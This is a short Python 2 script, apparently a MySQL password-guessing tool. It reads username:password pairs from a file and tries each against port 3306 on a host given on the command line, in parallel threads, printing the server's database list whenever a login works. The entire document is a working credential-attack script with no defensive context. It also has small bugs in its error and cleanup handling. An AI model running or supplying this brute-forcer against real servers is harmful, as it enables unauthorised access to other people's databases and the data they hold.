#!/usr/bin/env python
# -*- coding: utf-8 -*-

import MySQLdb as db
import sys
import threading
import time

HOST = sys.argv[1]
PORT = 3306
filename='mysql_user.txt'
fd = open(filename, "r")
DB = "information_schema"
TIMEOUT = 10

def mysql(HOST,PORT,username,password,DB,TIMEOUT):
	try:
		connection = db.Connection(host=HOST, port=PORT, user=username, passwd=password, db=DB, connect_timeout=TIMEOUT)
		dbhandler = connection.cursor()
		dbhandler.execute("SHOW DATABASES")
		result = dbhandler.fetchall()
	except Exception as e:
		connection.close()
	else:
		for item in result:
			print item
			connection.close()

for line in fd.readlines():
    username, password = line.strip().split(":")
    t = threading.Thread(target=mysql, args=(HOST,PORT,username,password,DB,TIMEOUT))
    t.start()
    time.sleep(0.3)
    
fd.close()
sys.exit(0)
